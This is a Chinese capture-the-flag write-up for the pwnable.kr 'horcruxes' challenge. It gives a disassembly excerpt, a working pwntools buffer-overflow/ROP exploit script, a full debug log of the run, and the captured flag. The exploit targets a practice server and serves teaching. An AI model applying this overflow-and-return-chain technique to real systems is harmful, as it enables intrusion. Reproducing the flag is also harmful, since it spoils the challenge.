
```asm
.text:0809FE4B                 public A
.text:0809FE4B A               proc near               ; CODE XREF: ropme+3B↓p
.text:0809FE4B ; __unwind {
.text:0809FE4B                 push    ebp
.text:0809FE4C                 mov     ebp, esp
.text:0809FE4E                 sub     esp, 8
.text:0809FE51                 mov     eax, ds:a
.text:0809FE56                 sub     esp, 8
.text:0809FE59                 push    eax
.text:0809FE5A                 push    offset format   ; "You found \"Tom Riddle's Diary\" (EXP +"... 
.text:0809FE5F                 call    _printf
.text:0809FE64                 add     esp, 10h
.text:0809FE67                 nop
.text:0809FE68                 leave
.text:0809FE69                 retn
.text:0809FE69 ; } // starts at 809FE4B
.text:0809FE69 A               endp
……
.text:0809FF05 G               proc near               ; CODE XREF: ropme+BF↓p
.text:0809FF05 ; __unwind {
.text:0809FF05                 push    ebp
.text:0809FF06                 mov     ebp, esp
.text:0809FF08                 sub     esp, 8
.text:0809FF0B                 mov     eax, ds:g
.text:0809FF10                 sub     esp, 8
.text:0809FF13                 push    eax
.text:0809FF14                 push    offset aYouFoundHarryP ; "You found \"Harry Potter\" (EXP +%d)\n"
.text:0809FF19                 call    _printf
.text:0809FF1E                 add     esp, 10h
.text:0809FF21                 nop
.text:0809FF22                 leave
.text:0809FF23                 retn
.text:0809FF23 ; } // starts at 809FF05
.text:0809FF23 G               endp
.text:0809FFFC                 call    ropme
```

exp 如下

```python
from pwn import *
context.log_level = 'debug'

hint_addr = 0x080A0324
fd_addr = 0x080A011D

A_addr = 0x0809FE4B
B_addr = 0x0809FE6A
C_addr = 0x0809FE89
D_addr = 0x0809FEA8
E_addr = 0x0809FEC7
F_addr = 0x0809FEE6
G_addr = 0x0809FF05
rop_addr = 0x080A0009
call_rop = 0x0809FFFC

#payload = 'A' * (0x74 +4) + p32(fd_addr)
#payload = 'A' * (0x74 + 4) + p32(hint_addr)
#payload = 'A' * (0x74 +4) + p32(A_addr) + p32(B_addr) + p32(C_addr) + p32(D_addr) + p32(E_addr) + p32(F_addr) + p32(G_addr) + p32(rop_addr)
payload = 'A' * (0x74 + 4) + p32(A_addr) + p32(B_addr) + p32(C_addr) + p32(D_addr) + p32(E_addr) + p32(F_addr) + p32(G_addr) + p32(call_rop)

conn = remote(host="pwnable.kr", port=9032)
conn.sendline("1")
conn.recvuntil("How many EXP did you earned? :")
conn.sendline(payload)

#conn.recvall()
conn.recvline() # recv "You'd better get more experience to kill Voldemort\n"
sum = 0
for i in range(0,7): # recv a ~ g
    res = conn.recvline()
    recvdata = int(res.strip('\n').split('+')[1][:-1])
    log.info("The %d" % i)
    log.info("recvdata %d" % recvdata)
    sum += recvdata
    conn.recvuntil("Menu:")
    conn.sendline("1")
    conn.recvuntil(" : ")
    conn.sendline(str(sum))
log.success("Flag: " + conn.recvline())
```

## 5. pwn

执行脚本，获得 flag：`Magic_spell_1s_4vad4_K3daVr4!`

```bash
whoami@DESKTOP-02CN0MD:~/pwn/horcruxes/attach$ python exp1.py
[+] Opening connection to pwnable.kr on port 9032: Done
[DEBUG] Sent 0x2 bytes:
'1\n'
[DEBUG] Received 0x39 bytes:
'Voldemort concealed his splitted soul inside 7 horcruxes.'
[DEBUG] Received 0x51 bytes:
'\n'
'Find all horcruxes, and destroy it!\n'
'\n'
'Select Menu:How many EXP did you earned? : '
[DEBUG] Sent 0x99 bytes:
00000000 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
*
00000070 41 41 41 41 41 41 41 41 4b fe 09 08 6a fe 09 08  │AAAA│AAAA│K···│j···│
00000080 89 fe 09 08 a8 fe 09 08 c7 fe 09 08 e6 fe 09 08  │····│····│····│····│
00000090 05 ff 09 08 fc ff 09 08 0a                      │····│····│·│
00000099
[DEBUG] Received 0x32 bytes:
"You'd better get more experience to kill Voldemort"
[DEBUG] Received 0x172 bytes:
'\n'
'You found "Tom Riddle\'s Diary" (EXP +661559703)\n'
'You found "Marvolo Gaunt\'s Ring" (EXP +-1930341090)\n'
'You found "Helga Hufflepuff\'s Cup" (EXP +2006157778)\n'
'You found "Salazar Slytherin\'s Locket" (EXP +1640323465)\n'
'You found "Rowena Ravenclaw\'s Diadem" (EXP +-1904074094)\n'
'You found "Nagini the Snake" (EXP +-1243168880)\n'
'You found "Harry Potter" (EXP +711916854)\n'
'Select Menu:'
[*] The 0
[*] recvdata 661559703
[*] The 1
[*] recvdata -1930341090
[*] The 2
[*] recvdata 2006157778
[*] The 3
[*] recvdata 1640323465
[*] The 4
[*] recvdata -1904074094
[*] The 5
[*] recvdata -1243168880
[*] The 6
[*] recvdata 711916854
[DEBUG] Sent 0x2 bytes:
'1\n'
[DEBUG] Received 0x1f bytes:
'How many EXP did you earned? : '
[DEBUG] Sent 0xa bytes:
'-57626264\n'
[DEBUG] Received 0x1e bytes:
'Magic_spell_1s_4vad4_K3daVr4!\n'
[+] Flag: Magic_spell_1s_4vad4_K3daVr4!
[*] Closed connection to pwnable.kr port 9032
whoami@DESKTOP-02CN0MD:~/pwn/horcruxes/attach$
```

## 参考连接

- [seccomp actions 标识符定义](https://bbs.kanxue.com/elink@f80K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6K6k6h3y4U0L8$3#2H3i4K6u0r3L8r3W2T1M7$3g2U0j5$3!0E0M7q4)9J5c8X3u0D9L8$3u0Q4x3V1j5@1j5K6p5&6y4o6t1#2k6X3p5$3z5h3y4X3j5U0c8X3y4$3c8W2y4e0t1J5y4h3b7$3y4K6k6S2x3U0k6W2k6U0m8T1y4o6b7J5k6e0t1^5i4K6u0r3K9h3&6U0L8s2g2V1k6g2)9J5c8Y4y4W2j5$3y4G2L8i4m8Q4x3X3g2Z5i4K6u0W2K9h3^5)
- [传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)
